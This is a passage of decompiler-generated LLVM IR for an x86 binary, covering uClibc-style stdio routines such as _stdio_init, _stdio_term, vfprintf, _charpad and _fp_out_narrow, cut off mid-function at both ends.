  uselistorder i32 %v0_805b019, { 1, 0 }
  uselistorder i32 %v1_805affa, { 0, 2, 1, 3 }
  uselistorder i32 %v2_805afe1, { 1, 0 }
  uselistorder i32 %v1_805afca, { 1, 0, 2 }
  uselistorder i32 %v11_805af8c, { 1, 0 }
  uselistorder i32 %v0_805af95.pre, { 1, 0 }
  uselistorder i32 %v1_805af5d, { 1, 0 }
  uselistorder i32 %v0_805af59, { 1, 0 }
  uselistorder i32 %v1_805af0f, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_805aefe, { 1, 0 }
  uselistorder i32 %v0_805aed1, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33 }
  uselistorder i32 %arg4, { 0, 3, 2, 1, 4, 5 }
  uselistorder label %dec_label_pc_805b0b5, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_805b0ae, { 1, 0 }
  uselistorder label %dec_label_pc_805b020, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805af8f, { 1, 0 }
  uselistorder label %dec_label_pc_805af7f, { 1, 0 }
  uselistorder label %dec_label_pc_805af3c, { 1, 0 }
  uselistorder label %dec_label_pc_805af06, { 1, 0 }
  uselistorder label %dec_label_pc_805aef8, { 1, 0 }
  uselistorder label %dec_label_pc_805aeed, { 2, 0, 1 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805b0c1 = load i32, i32* @edi, align 4
  %v0_805b0c2 = load i32, i32* @esi, align 4
  %v0_805b0c3 = load i32, i32* @ebx, align 4
  store i32 %v0_805b0c3, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_805b0cc = call i32 @__errno_location(i32 %v0_805b0c3)
  store i32 %v1_805b0cc, i32* @edi, align 4
  %v0_805b0d6 = load i32, i32* @global_var_8073dc0.80, align 64
  store i32 %v0_805b0d6, i32* @esi, align 4
  %v1_805b0dc = inttoptr i32 %v1_805b0cc to i32*
  %v2_805b0dc = load i32, i32* %v1_805b0dc, align 4
  store i32 %v2_805b0dc, i32* %ebp.global-to-local, align 4
  %v1_805b0e0 = call i32 @isatty(i32 0)
  %v0_805b0e5 = load i32, i32* @ebx, align 4
  %v2_805b0e7 = sub i32 %v0_805b0e5, %v1_805b0e0
  %v2_805b0f2 = mul i32 %v2_805b0e7, 256
  %v0_805b0f5 = load i32, i32* @esi, align 4
  %v2_805b0f5 = xor i32 %v0_805b0f5, %v2_805b0f2
  %v1_805b0f7 = trunc i32 %v2_805b0f5 to i16
  store i16 %v1_805b0f7, i16* bitcast (i32* @global_var_8073dc0.80 to i16*), align 64
  %v0_805b0fe = load i32, i32* @global_var_8073e10.78, align 16
  store i32 %v0_805b0fe, i32* @esi, align 4
  %v1_805b104 = call i32 @isatty(i32 1)
  %v0_805b109 = load i32, i32* @ebx, align 4
  %v2_805b109 = sub i32 %v0_805b109, %v1_805b104
  %v2_805b10b = mul i32 %v2_805b109, 256
  %v0_805b10e = load i32, i32* @esi, align 4
  %v2_805b10e = xor i32 %v2_805b10b, %v0_805b10e
  %v1_805b110 = trunc i32 %v2_805b10e to i16
  store i16 %v1_805b110, i16* bitcast (i32* @global_var_8073e10.78 to i16*), align 16
  %v0_805b117 = load i32, i32* %ebp.global-to-local, align 4
  %v1_805b117 = load i32, i32* @edi, align 4
  %v2_805b117 = inttoptr i32 %v1_805b117 to i32*
  store i32 %v0_805b117, i32* %v2_805b117, align 4
  %v2_805b11c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805b11c, i32* @ebx, align 4
  store i32 %v0_805b0c2, i32* @esi, align 4
  store i32 %v0_805b0c1, i32* @edi, align 4
  ret i32 %v1_805b104

; uselistorder directives
  uselistorder i32 %v1_805b0cc, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_805b12f = inttoptr i32 %arg1 to i16*
  %v4_805b12f = call i32 @memcpy(i16* %v3_805b12f, i32 ptrtoint (i32* @global_var_806cbb4.730 to i32), i32 24)
  ret i32 %v4_805b12f
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805b138 = load i32, i32* @esi, align 4
  %v0_805b139 = load i32, i32* @ebx, align 4
  store i32 %v0_805b139, i32* %stack_var_-8, align 4
  %v2_805b142 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_8073d80.729 to i32))
  store i32 %v2_805b142, i32* %eax.global-to-local, align 4
  %v2_805b14e = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_8073d98.718 to i32))
  store i32 %v2_805b14e, i32* %eax.global-to-local, align 4
  %storemerge22 = load i32, i32* bitcast (i32** @global_var_8073d7c.702 to i32*), align 4
  store i32 %storemerge22, i32* @ebx, align 4
  %v1_805b19823 = icmp eq i32 %storemerge22, 0
  %v1_805b19a24 = icmp eq i1 %v1_805b19823, false
  br i1 %v1_805b19a24, label %dec_label_pc_805b15b.lr.ph, label %dec_label_pc_805b1b8.preheader

dec_label_pc_805b15b.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_805b15b

dec_label_pc_805b15b:                             ; preds = %dec_label_pc_805b15b.lr.ph, %dec_label_pc_805b182
  %storemerge25 = phi i32 [ %storemerge22, %dec_label_pc_805b15b.lr.ph ], [ %storemerge, %dec_label_pc_805b182 ]
  %v1_805b15e = add i32 %storemerge25, 56
  store i32 %v1_805b15e, i32* @esi, align 4
  %v2_805b162 = call i32 @pthread_mutex_trylock(i32 %v1_805b15e)
  store i32 %v2_805b162, i32* %eax.global-to-local, align 4
  %v1_805b16a = icmp eq i32 %v2_805b162, 0
  br i1 %v1_805b16a, label %dec_label_pc_805b182, label %dec_label_pc_805b16e

dec_label_pc_805b16e:                             ; preds = %dec_label_pc_805b15b
  %v0_805b16e = load i32, i32* @ebx, align 4
  %v1_805b16e = add i32 %v0_805b16e, 8
  %v2_805b16e = inttoptr i32 %v1_805b16e to i32*
  %v3_805b16e = load i32, i32* %v2_805b16e, align 4
  store i32 %v3_805b16e, i32* %eax.global-to-local, align 4
  %v1_805b171 = inttoptr i32 %v0_805b16e to i16*
  store i16 48, i16* %v1_805b171, align 2
  %v0_805b176 = load i32, i32* %eax.global-to-local, align 4
  %v1_805b176 = load i32, i32* @ebx, align 4
  %v2_805b176 = add i32 %v1_805b176, 24
  %v3_805b176 = inttoptr i32 %v2_805b176 to i32*
  store i32 %v0_805b176, i32* %v3_805b176, align 4
  %v0_805b179 = load i32, i32* %eax.global-to-local, align 4
  %v1_805b179 = load i32, i32* @ebx, align 4
  %v2_805b179 = add i32 %v1_805b179, 28
  %v3_805b179 = inttoptr i32 %v2_805b179 to i32*
  store i32 %v0_805b179, i32* %v3_805b179, align 4
  %v0_805b17c = load i32, i32* %eax.global-to-local, align 4
  %v1_805b17c = load i32, i32* @ebx, align 4
  %v2_805b17c = add i32 %v1_805b17c, 16
  %v3_805b17c = inttoptr i32 %v2_805b17c to i32*
  store i32 %v0_805b17c, i32* %v3_805b17c, align 4
  %v0_805b17f = load i32, i32* %eax.global-to-local, align 4
  %v1_805b17f = load i32, i32* @ebx, align 4
  %v2_805b17f = add i32 %v1_805b17f, 20
  %v3_805b17f = inttoptr i32 %v2_805b17f to i32*
  store i32 %v0_805b17f, i32* %v3_805b17f, align 4
  br label %dec_label_pc_805b182

dec_label_pc_805b182:                             ; preds = %dec_label_pc_805b15b, %dec_label_pc_805b16e
  %v0_805b185 = load i32, i32* @ebx, align 4
  %v1_805b185 = add i32 %v0_805b185, 52
  %v2_805b185 = inttoptr i32 %v1_805b185 to i32*
  store i32 1, i32* %v2_805b185, align 4
  %v0_805b18c = load i32, i32* @esi, align 4
  %v2_805b18d = call i32 @__stdio_init_mutex(i32 %v0_805b18c)
  store i32 %v2_805b18d, i32* %eax.global-to-local, align 4
  %v0_805b192 = load i32, i32* @ebx, align 4
  %v1_805b192 = add i32 %v0_805b192, 32
  %v2_805b192 = inttoptr i32 %v1_805b192 to i32*
  %storemerge = load i32, i32* %v2_805b192, align 4
  store i32 %storemerge, i32* @ebx, align 4
  %v1_805b198 = icmp eq i32 %storemerge, 0
  %v1_805b19a = icmp eq i1 %v1_805b198, false
  br i1 %v1_805b19a, label %dec_label_pc_805b15b, label %dec_label_pc_805b195.dec_label_pc_805b1b8.preheader_crit_edge

dec_label_pc_805b195.dec_label_pc_805b1b8.preheader_crit_edge: ; preds = %dec_label_pc_805b182
  %storemerge23.pre = load i32, i32* bitcast (i32** @global_var_8073d7c.702 to i32*), align 4
  br label %dec_label_pc_805b1b8.preheader

dec_label_pc_805b1b8.preheader:                   ; preds = %dec_label_pc_805b195.dec_label_pc_805b1b8.preheader_crit_edge, %entry
  %storemerge23 = phi i32 [ %storemerge23.pre, %dec_label_pc_805b195.dec_label_pc_805b1b8.preheader_crit_edge ], [ %storemerge22, %entry ]
  store i32 %storemerge23, i32* @ebx, align 4
  %v1_805b1b84 = icmp eq i32 %storemerge23, 0
  %v1_805b1ba11 = icmp eq i1 %v1_805b1b84, false
  br i1 %v1_805b1ba11, label %dec_label_pc_805b1a4.preheader, label %dec_label_pc_805b1bc

dec_label_pc_805b1a4.preheader:                   ; preds = %dec_label_pc_805b1b8.preheader
  br label %dec_label_pc_805b1a4

dec_label_pc_805b1a4:                             ; preds = %dec_label_pc_805b1a4.preheader, %dec_label_pc_805b1b5
  %v0_805b1ac = phi i32 [ %storemerge2, %dec_label_pc_805b1b5 ], [ %storemerge23, %dec_label_pc_805b1a4.preheader ]
  %v1_805b1a4 = inttoptr i32 %v0_805b1ac to i8*
  %v2_805b1a4 = load i8, i8* %v1_805b1a4, align 1
  %v3_805b1a4 = and i8 %v2_805b1a4, 64
  %v4_805b1a4 = icmp eq i8 %v3_805b1a4, 0
  br i1 %v4_805b1a4, label %dec_label_pc_805b1b5, label %dec_label_pc_805b1a9

dec_label_pc_805b1a9:                             ; preds = %dec_label_pc_805b1a4
  %v2_805b1ad = call i32 @__stdio_wcommit(i32 %v0_805b1ac)
  store i32 %v2_805b1ad, i32* %eax.global-to-local, align 4
  %v0_805b1b5.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805b1b5

dec_label_pc_805b1b5:                             ; preds = %dec_label_pc_805b1a4, %dec_label_pc_805b1a9
  %v0_805b1b5 = phi i32 [ %v0_805b1ac, %dec_label_pc_805b1a4 ], [ %v0_805b1b5.pre, %dec_label_pc_805b1a9 ]
  %v1_805b1b5 = add i32 %v0_805b1b5, 32
  %v2_805b1b5 = inttoptr i32 %v1_805b1b5 to i32*
  %storemerge2 = load i32, i32* %v2_805b1b5, align 4
  store i32 %storemerge2, i32* @ebx, align 4
  %v1_805b1b8 = icmp eq i32 %storemerge2, 0
  %v1_805b1ba = icmp eq i1 %v1_805b1b8, false
  br i1 %v1_805b1ba, label %dec_label_pc_805b1a4, label %dec_label_pc_805b1bc

dec_label_pc_805b1bc:                             ; preds = %dec_label_pc_805b1b5, %dec_label_pc_805b1b8.preheader
  %v2_805b1bc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805b1bc, i32* %eax.global-to-local, align 4
  %v2_805b1bd = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805b1bd, i32* @ebx, align 4
  store i32 %v0_805b138, i32* @esi, align 4
  ret i32 %v2_805b1bc

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 2, 0 }
  uselistorder i32 %storemerge23, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_805b1b5, { 1, 0 }
  uselistorder label %dec_label_pc_805b1a4, { 1, 0 }
  uselistorder label %dec_label_pc_805b182, { 1, 0 }
  uselistorder label %dec_label_pc_805b15b, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_805b1c0 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805b1c8 = add i32 %arg1, 8
  %v2_805b1c8 = inttoptr i32 %v1_805b1c8 to i32*
  %v3_805b1c8 = load i32, i32* %v2_805b1c8, align 4
  store i32 %v3_805b1c8, i32* %edx.global-to-local, align 4
  %v1_805b1cb = add i32 %arg1, 16
  %v2_805b1cb = inttoptr i32 %v1_805b1cb to i32*
  %v3_805b1cb = load i32, i32* %v2_805b1cb, align 4
  %v2_805b1ce = sub i32 %v3_805b1cb, %v3_805b1c8
  %v12_805b1ce = icmp eq i32 %v2_805b1ce, 0
  store i32 %v2_805b1ce, i32* %eax.global-to-local, align 4
  br i1 %v12_805b1ce, label %dec_label_pc_805b1e1, label %dec_label_pc_805b1d2

dec_label_pc_805b1d2:                             ; preds = %entry
  store i32 %v3_805b1c8, i32* %v2_805b1cb, align 4
  %v0_805b1d5 = load i32, i32* @ecx, align 4
  %v0_805b1d6 = load i32, i32* %eax.global-to-local, align 4
  %v0_805b1d7 = load i32, i32* %edx.global-to-local, align 4
  %v0_805b1d8 = load i32, i32* @ebx, align 4
  %v4_805b1d9 = inttoptr i32 %v0_805b1d8 to i16*
  %v5_805b1d9 = call i32 @__stdio_WRITE(i16* %v4_805b1d9, i32 %v0_805b1d7, i32 %v0_805b1d6, i32 %v0_805b1d5)
  store i32 %v5_805b1d9, i32* %eax.global-to-local, align 4
  %v0_805b1e1.pre = load i32, i32* @ebx, align 4
  %v2_805b1e7.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_805b1e1

dec_label_pc_805b1e1:                             ; preds = %entry, %dec_label_pc_805b1d2
  %v2_805b1e7 = phi i32 [ %tmp11, %entry ], [ %v2_805b1e7.pre, %dec_label_pc_805b1d2 ]
  %v0_805b1e1 = phi i32 [ %arg1, %entry ], [ %v0_805b1e1.pre, %dec_label_pc_805b1d2 ]
  %v1_805b1e1 = add i32 %v0_805b1e1, 16
  %v2_805b1e1 = inttoptr i32 %v1_805b1e1 to i32*
  %v3_805b1e1 = load i32, i32* %v2_805b1e1, align 4
  store i32 %v3_805b1e1, i32* %eax.global-to-local, align 4
  %v2_805b1e4 = add i32 %v0_805b1e1, 8
  %v3_805b1e4 = inttoptr i32 %v2_805b1e4 to i32*
  %v4_805b1e4 = load i32, i32* %v3_805b1e4, align 4
  %v5_805b1e4 = sub i32 %v3_805b1e1, %v4_805b1e4
  store i32 %v5_805b1e4, i32* %eax.global-to-local, align 4
  store i32 %v2_805b1e7, i32* @edx, align 4
  store i32 %v0_805b1c0, i32* @ebx, align 4
  ret i32 %v5_805b1e4

; uselistorder directives
  uselistorder i32 %v0_805b1e1, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_805b1e1, { 1, 0 }
}

define i32 @__GI_vfprintf(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_805b1ec = load i32, i32* @edi, align 4
  %v0_805b1ed = load i32, i32* @esi, align 4
  %v0_805b1ee = load i32, i32* @ebx, align 4
  %v4_805b1f2 = ptrtoint i16* %arg1 to i32
  store i32 %v4_805b1f2, i32* @esi, align 4
  %v1_805b1f6 = add i32 %v4_805b1f2, 52
  %v2_805b1f6 = inttoptr i32 %v1_805b1f6 to i32*
  %v3_805b1f6 = load i32, i32* %v2_805b1f6, align 4
  store i32 %v3_805b1f6, i32* @edi, align 4
  %v1_805b1f9 = icmp eq i32 %v3_805b1f6, 0
  %v1_805b1fb = icmp eq i1 %v1_805b1f9, false
  br i1 %v1_805b1fb, label %dec_label_pc_805b21c, label %dec_label_pc_805b1fd

dec_label_pc_805b1fd:                             ; preds = %entry
  %v1_805b1fd = add i32 %v4_805b1f2, 56
  store i32 %v1_805b1fd, i32* @ebx, align 4
  %v5_805b20c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134583465, i32 %v1_805b1fd)
  %v0_805b211 = load i32, i32* @ebx, align 4
  %v2_805b214 = call i32 @pthread_mutex_lock(i32 %v0_805b211)
  %v0_805b21c.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805b21c

dec_label_pc_805b21c:                             ; preds = %entry, %dec_label_pc_805b1fd
  %v0_805b232 = phi i32 [ %v4_805b1f2, %entry ], [ %v0_805b21c.pre, %dec_label_pc_805b1fd ]
  %v1_805b21c = inttoptr i32 %v0_805b232 to i16*
  %v2_805b21c = load i16, i16* %v1_805b21c, align 2
  %v1_805b21f = and i16 %v2_805b21c, 192
  %v6_805b224 = icmp eq i16 %v1_805b21f, 192
  br i1 %v6_805b224, label %dec_label_pc_805b21c.dec_label_pc_805b242_crit_edge, label %dec_label_pc_805b22b

dec_label_pc_805b21c.dec_label_pc_805b242_crit_edge: ; preds = %dec_label_pc_805b21c
  br label %dec_label_pc_805b242

dec_label_pc_805b22b:                             ; preds = %dec_label_pc_805b21c
  %v0_805b22b = load i32, i32* @ecx, align 4
  %v6_805b233 = call i32 @__stdio_trans2w_o(i16* %v1_805b21c, i32 128, i32 %v0_805b22b, i32 %v0_805b22b)
  store i32 -1, i32* @ebx, align 4
  %v1_805b23e = icmp eq i32 %v6_805b233, 0
  %v1_805b240 = icmp eq i1 %v1_805b23e, false
  br i1 %v1_805b240, label %dec_label_pc_805b256, label %dec_label_pc_805b22b.dec_label_pc_805b242_crit_edge

dec_label_pc_805b22b.dec_label_pc_805b242_crit_edge: ; preds = %dec_label_pc_805b22b
  %v0_805b24b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805b242

dec_label_pc_805b242:                             ; preds = %dec_label_pc_805b21c.dec_label_pc_805b242_crit_edge, %dec_label_pc_805b22b.dec_label_pc_805b242_crit_edge
  %v0_805b24b = phi i32 [ %v0_805b232, %dec_label_pc_805b21c.dec_label_pc_805b242_crit_edge ], [ %v0_805b24b.pre, %dec_label_pc_805b22b.dec_label_pc_805b242_crit_edge ]
  %v0_805b242 = load i32, i32* @edx, align 4
  %v5_805b24c = inttoptr i32 %arg2 to i8*
  %v6_805b24c = call i32 @_vfprintf_internal(i32 %v0_805b24b, i8* %v5_805b24c, i32 %arg3, i32 %v0_805b242)
  store i32 %v6_805b24c, i32* @ebx, align 4
  br label %dec_label_pc_805b256

dec_label_pc_805b256:                             ; preds = %dec_label_pc_805b22b, %dec_label_pc_805b242
  %v0_805b26e7 = phi i32 [ -1, %dec_label_pc_805b22b ], [ %v6_805b24c, %dec_label_pc_805b242 ]
  br i1 %v1_805b1fb, label %dec_label_pc_805b26b, label %dec_label_pc_805b25a

dec_label_pc_805b25a:                             ; preds = %dec_label_pc_805b256
  %v4_805b263 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  %v0_805b26e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805b26b

dec_label_pc_805b26b:                             ; preds = %dec_label_pc_805b256, %dec_label_pc_805b25a
  %v0_805b26e = phi i32 [ %v0_805b26e7, %dec_label_pc_805b256 ], [ %v0_805b26e.pre, %dec_label_pc_805b25a ]
  store i32 %v0_805b1ee, i32* @ebx, align 4
  store i32 %v0_805b1ed, i32* @esi, align 4
  store i32 %v0_805b1ec, i32* @edi, align 4
  ret i32 %v0_805b26e

; uselistorder directives
  uselistorder i32 (i32, i8*, i32, i32)* @_vfprintf_internal, { 1, 0 }
  uselistorder label %dec_label_pc_805b26b, { 1, 0 }
  uselistorder label %dec_label_pc_805b256, { 1, 0 }
  uselistorder label %dec_label_pc_805b242, { 1, 0 }
  uselistorder label %dec_label_pc_805b21c, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_805b274 = load i32, i32* @edi, align 4
  %v0_805b275 = load i32, i32* @esi, align 4
  %v0_805b276 = load i32, i32* @ebx, align 4
  %v0_805b277 = load i32, i32* @eax, align 4
  store i32 %v0_805b277, i32* @edi, align 4
  %v0_805b27c = load i32, i32* @ecx, align 4
  store i32 %v0_805b27c, i32* @esi, align 4
  store i32 %v0_805b27c, i32* @ebx, align 4
  %v0_805b280 = load i32, i32* @edx, align 4
  store i32 %v0_805b280, i32* %stack_var_-13, align 4
  %v1_805b2872 = icmp eq i32 %v0_805b27c, 0
  br i1 %v1_805b2872, label %dec_label_pc_805b29f, label %dec_label_pc_805b28b.lr.ph

dec_label_pc_805b28b.lr.ph:                       ; preds = %entry
  %v2_805b28b = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_805b28b

dec_label_pc_805b286:                             ; preds = %dec_label_pc_805b28b
  %v1_805b286 = add i32 %v0_805b286, -1
  %v8_805b286 = icmp eq i32 %v1_805b286, 0
  store i32 %v1_805b286, i32* @ebx, align 4
  br i1 %v8_805b286, label %dec_label_pc_805b29f.loopexit, label %dec_label_pc_805b286.dec_label_pc_805b28b_crit_edge

dec_label_pc_805b286.dec_label_pc_805b28b_crit_edge: ; preds = %dec_label_pc_805b286
  %v0_805b28f.pre = load i32, i32* @edx, align 4
  %v0_805b290.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805b28b

dec_label_pc_805b28b:                             ; preds = %dec_label_pc_805b286.dec_label_pc_805b28b_crit_edge, %dec_label_pc_805b28b.lr.ph
  %v0_805b290 = phi i32 [ %v0_805b290.pre, %dec_label_pc_805b286.dec_label_pc_805b28b_crit_edge ], [ %v0_805b277, %dec_label_pc_805b28b.lr.ph ]
  %v0_805b28f = phi i32 [ %v0_805b28f.pre, %dec_label_pc_805b286.dec_label_pc_805b28b_crit_edge ], [ %v0_805b280, %dec_label_pc_805b28b.lr.ph ]
  %v4_805b294 = call i32 @__stdio_fwrite(i32 %v2_805b28b, i32 1, i32 %v0_805b290, i32 %v0_805b28f)
  %v8_805b29c = icmp eq i32 %v4_805b294, 1
  %v0_805b286 = load i32, i32* @ebx, align 4
  br i1 %v8_805b29c, label %dec_label_pc_805b286, label %dec_label_pc_805b29f.loopexit

dec_label_pc_805b29f.loopexit:                    ; preds = %dec_label_pc_805b286, %dec_label_pc_805b28b
  %v1_805b29f.ph = phi i32 [ %v0_805b286, %dec_label_pc_805b28b ], [ 0, %dec_label_pc_805b286 ]
  %v0_805b29f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805b29f

dec_label_pc_805b29f:                             ; preds = %dec_label_pc_805b29f.loopexit, %entry
  %v0_805b29f = phi i32 [ 0, %entry ], [ %v0_805b29f.pre, %dec_label_pc_805b29f.loopexit ]
  %v1_805b29f = phi i32 [ 0, %entry ], [ %v1_805b29f.ph, %dec_label_pc_805b29f.loopexit ]
  %v2_805b29f = sub i32 %v0_805b29f, %v1_805b29f
  store i32 %v0_805b276, i32* @ebx, align 4
  store i32 %v0_805b275, i32* @esi, align 4
  store i32 %v0_805b274, i32* @edi, align 4
  ret i32 %v2_805b29f

; uselistorder directives
  uselistorder i32 %v1_805b286, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_805b29f.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_805b2bd = trunc i32 %arg2 to i8
  %v5_805b2bd = icmp slt i8 %v3_805b2bd, 0
  %v1_805b2bf = icmp eq i1 %v5_805b2bd, false
  %tmp20 = ptrtoint i8* %arg4 to i32
  br i1 %v1_805b2bf, label %dec_label_pc_805b2f0, label %dec_label_pc_805b2c1

dec_label_pc_805b2c1:                             ; preds = %entry
  %v3_805b2c8 = call i32 @strlen(i8* %arg4)
  %v0_805b2d0 = load i32, i32* @ebx, align 4
  %v2_805b2d0 = sub i32 %v0_805b2d0, %v3_805b2c8
  store i32 %v2_805b2d0, i32* @ebx, align 4
  store i32 %v3_805b2c8, i32* @esi, align 4
  %tmp22 = icmp slt i32 %v2_805b2d0, 1
  br i1 %tmp22, label %dec_label_pc_805b2ee, label %dec_label_pc_805b2d8

dec_label_pc_805b2d8:                             ; preds = %dec_label_pc_805b2c1
  %v0_805b2d8 = load i32, i32* @edi, align 4
  %v1_805b2d8 = urem i32 %v0_805b2d8, 128
  store i32 %v1_805b2d8, i32* @edi, align 4
  store i32 %v2_805b2d0, i32* @ecx, align 4
  store i32 %v1_805b2d8, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v0_805b2e3 = call i32 @_charpad()
  store i32 %v0_805b2e3, i32* @ebp, align 4
  %v12_805b2ea = icmp eq i32 %v0_805b2e3, %v2_805b2d0
  %v1_805b2ec = icmp eq i1 %v12_805b2ea, false
  br i1 %v1_805b2ec, label %dec_label_pc_805b30a, label %dec_label_pc_805b2d8.dec_label_pc_805b2ee_crit_edge

dec_label_pc_805b2d8.dec_label_pc_805b2ee_crit_edge: ; preds = %dec_label_pc_805b2d8
  %v0_805b2ee.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805b2ee

dec_label_pc_805b2ee:                             ; preds = %dec_label_pc_805b2d8.dec_label_pc_805b2ee_crit_edge, %dec_label_pc_805b2c1
  %v0_805b2ee = phi i32 [ %v0_805b2ee.pre, %dec_label_pc_805b2d8.dec_label_pc_805b2ee_crit_edge ], [ %v3_805b2c8, %dec_label_pc_805b2c1 ]
  store i32 %v0_805b2ee, i32* @ebx, align 4
  br label %dec_label_pc_805b2f0

dec_label_pc_805b2f0:                             ; preds = %entry, %dec_label_pc_805b2ee
  %v0_805b2fb = phi i32 [ %arg3, %entry ], [ %v0_805b2ee, %dec_label_pc_805b2ee ]
  %tmp23 = icmp slt i32 %v0_805b2fb, 1
  br i1 %tmp23, label %dec_label_pc_805b308, label %dec_label_pc_805b2f6

dec_label_pc_805b2f6:                             ; preds = %dec_label_pc_805b2f0
  %v0_805b2f6 = load i32, i32* @ecx, align 4
  %v5_805b300 = call i32 @__stdio_fwrite(i32 %tmp20, i32 %v0_805b2fb, i32 %arg1, i32 %v0_805b2f6)
  br label %dec_label_pc_805b308

dec_label_pc_805b308:                             ; preds = %dec_label_pc_805b2f0, %dec_label_pc_805b2f6
  %v1_805b308 = phi i32 [ 0, %dec_label_pc_805b2f0 ], [ %v5_805b300, %dec_label_pc_805b2f6 ]
  %v0_805b308 = load i32, i32* @ebp, align 4
  %v2_805b308 = add i32 %v0_805b308, %v1_805b308
  br label %dec_label_pc_805b30a

dec_label_pc_805b30a:                             ; preds = %dec_label_pc_805b2d8, %dec_label_pc_805b308
  %v0_805b30d = phi i32 [ %v0_805b2e3, %dec_label_pc_805b2d8 ], [ %v2_805b308, %dec_label_pc_805b308 ]
  ret i32 %v0_805b30d

; uselistorder directives
  uselistorder i32 %v0_805b2fb, { 1, 0 }
  uselistorder i32 %v0_805b2e3, { 1, 0, 2 }
  uselistorder i32 %v1_805b2d8, { 1, 0 }
  uselistorder i32 %v2_805b2d0, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805b30a, { 1, 0 }
  uselistorder label %dec_label_pc_805b308, { 1, 0 }
  uselistorder label %dec_label_pc_805b2f0, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %v4_805b31e = ptrtoint i8* %arg2 to i32
  store i32 %v4_805b31e, i32* @ebx, align 4
  %v2_805b326 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_805b326, i32* @esi, align 4
  %v5_805b32b = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_805b31e)
  store i32 %v5_805b32b, i32* %eax.global-to-local, align 4
  %v2_805b333 = icmp slt i32 %v5_805b32b, 0
  %v1_805b335 = icmp eq i1 %v2_805b333, false
  br i1 %v1_805b335, label %dec_label_pc_805b375, label %dec_label_pc_805b337

dec_label_pc_805b337:                             ; preds = %entry
  %v3_805b337 = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_805b337, i32* @ebx, align 4
  %v5_805b33e = inttoptr i32 %v3_805b337 to i8*
  %v3_805b33f = call i32 @strlen(i8* %v5_805b33e)
  store i32 %v3_805b33f, i32* %eax.global-to-local, align 4
  %v1_805b347 = icmp eq i32 %v3_805b33f, 0
  store i32 -1, i32* %stack_var_-364, align 4
  br i1 %v1_805b347, label %dec_label_pc_805b8ae, label %dec_label_pc_805b356

dec_label_pc_805b356:                             ; preds = %dec_label_pc_805b337
  %v0_805b356 = load i32, i32* @edx, align 4
  %v0_805b35f = load i32, i32* @ebx, align 4
